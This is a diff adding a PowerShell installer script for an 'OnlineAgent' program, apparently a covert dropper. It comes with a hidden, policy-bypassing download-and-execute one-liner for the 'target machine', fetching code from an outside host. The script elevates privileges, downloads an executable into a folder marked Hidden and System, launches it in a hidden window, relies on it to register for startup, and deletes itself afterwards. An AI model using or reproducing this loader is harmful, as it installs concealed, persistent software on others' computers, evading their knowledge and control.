@@ -1,0 +1,82 @@
+# Run this command on the target machine to deploy:
+# powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iex ((New-Object Net.WebClient).DownloadString('https://antaryami.ragibuddin.in/deploy.txt')); exit"; exit
+
+
+# ====================================================================
+# ANTARYAMI ENTERPRISE DEPLOYER (UPDATED FOR SESSION 1)
+# Production Environment Setup Script for OnlineAgent
+# ====================================================================
+
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+$Host.UI.RawUI.WindowTitle = "System Infrastructure Maintenance Setup"
+
+# 1. Native Integrity Check (Silent Elevation Request)
+$currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
+$principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
+
+if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    if ($PSCommandPath) {
+        Start-Process powershell.exe -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$PSCommandPath`"" -Verb RunAs
+    } else {
+        $filelessCommand = "iex ((New-Object Net.WebClient).DownloadString('https://antaryami.ragibuddin.in/deploy.txt'))"
+        Start-Process powershell.exe -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "`"$filelessCommand`"" -Verb RunAs
+    }
+    exit
+}
+
+# ====================================================================
+# 2. PURANA WALA DELETE KARNA (CLEANUP OLD INSTANCES)
+# ====================================================================
+# Stop active process
+Stop-Process -Name "OnlineAgent" -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 1
+
+# Delete old background tasks to prevent Screenshot Error (Session 0 conflict)
+Unregister-ScheduledTask -TaskName "OnlineAgent_Maintenance" -Confirm:$false -ErrorAction SilentlyContinue
+Unregister-ScheduledTask -TaskName "OnlineAgent_Backup" -Confirm:$false -ErrorAction SilentlyContinue
+
+# 3. Infrastructure Configuration Tokens
+$exeUrl = "https://antaryami.ragibuddin.in/OnlineAgent.exe" 
+$installDir = "$env:ProgramData\OnlineAgent"
+$targetFile = Join-Path $installDir "OnlineAgent.exe" 
+
+# 4. Target Workspace Provisioning & Unlocking
+if (-not (Test-Path $installDir)) {
+    New-Item -Path $installDir -ItemType Directory -Force | Out-Null
+} else {
+    $folder = Get-Item $installDir -Force
+    $folder.Attributes = 'Directory' # Reset attributes temporarily to allow safe file write
+}
+
+# 5. Download New Executable
+try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    $webClient = New-Object Net.WebClient
+    $webClient.DownloadFile($exeUrl, $targetFile)
+} catch {
+    Invoke-WebRequest -Uri $exeUrl -OutFile $targetFile -ErrorAction SilentlyContinue
+}
+
+# Secure Workspace Isolation
+$hiddenFolder = Get-Item $installDir -Force
+$hiddenFolder.Attributes = 'Directory', 'Hidden', 'System'
+
+# ====================================================================
+# 6. LAUNCH IN SESSION 1 (Interactive Desktop)
+# ====================================================================
+$processInfo = New-Object System.Diagnostics.ProcessStartInfo
+$processInfo.FileName = $targetFile
+$processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+$processInfo.UseShellExecute = $true
+
+# Runs the new exe so it can register itself in HKCU Startup Registry safely
+[System.Diagnostics.Process]::Start($processInfo) | Out-Null
+
+# 7. Self-Trace Clean Queue
+if ($PSCommandPath) {
+    $cleanupCmd = "Start-Sleep -Seconds 3; Remove-Item -Path '$PSCommandPath' -Force -ErrorAction SilentlyContinue"
+    Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle", "Hidden", "-Command", "& {$cleanupCmd}" -WindowStyle Hidden
+}
+
+[Environment]::Exit(0)
+
